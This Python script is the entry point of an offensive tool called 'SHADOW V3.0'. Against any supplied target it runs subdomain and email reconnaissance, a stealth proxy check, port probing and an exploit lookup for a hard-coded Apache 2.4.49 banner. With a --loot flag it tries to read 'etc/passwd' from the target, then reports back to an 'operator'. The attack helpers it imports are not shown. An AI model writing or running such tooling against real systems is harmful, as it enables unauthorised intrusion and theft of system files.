import argparse
import sys
import os
from tools.devops.probing import probe_service
from tools.devops.fuzzer import test_cors_exposure, test_path_traversal
from tools.devops.stealth_recon import shadow_recon_subdomains, shadow_recon_emails, shadow_stealth_proxy_check
from tools.devops.exploit_exfil import shadow_auto_exploit_search, shadow_loot_file, shadow_notify
from tools.devops.reporter import generate_shadow_report

def main():
    parser = argparse.ArgumentParser(description="SHADOW V3.0 - SUPREME COMMAND")
    parser.add_argument("--target", required=True)
    parser.add_argument("--loot", action="store_true", help="Enable automatic looting")
    args = parser.parse_args()
    
    print(f"[*] SHADOW V3.0 Initialized for target: {args.target}")
    
    findings = {}
    findings['subdomains'] = shadow_recon_subdomains(args.target)
    findings['emails'] = shadow_recon_emails(args.target)
    findings['stealth_ip'] = shadow_stealth_proxy_check().get("ip", "Unknown")
    
    # 1. Probing & Exploit Search
    port_80 = probe_service(args.target, 80)
    findings['services'] = {"port_80": port_80}
    
    # Auto-search exploits if banner found
    # (Simplified for demonstration)
    findings['exploits'] = shadow_auto_exploit_search("Apache 2.4.49") 

    # 2. Looting if enabled
    if args.loot and args.target.startswith("http"):
        print("[!] Attempting to loot sensitive files...")
        findings['loot'] = shadow_loot_file(args.target, "etc/passwd")

    # 3. Generate Supreme Report
    report_path = generate_shadow_report(args.target, findings)
    print(f"[*] Intelligence Report generated: {report_path}")
    
    # 4. Notify Operator
    shadow_notify(f"Mission complete for {args.target}. Report ready.")

if __name__ == "__main__":
    main()
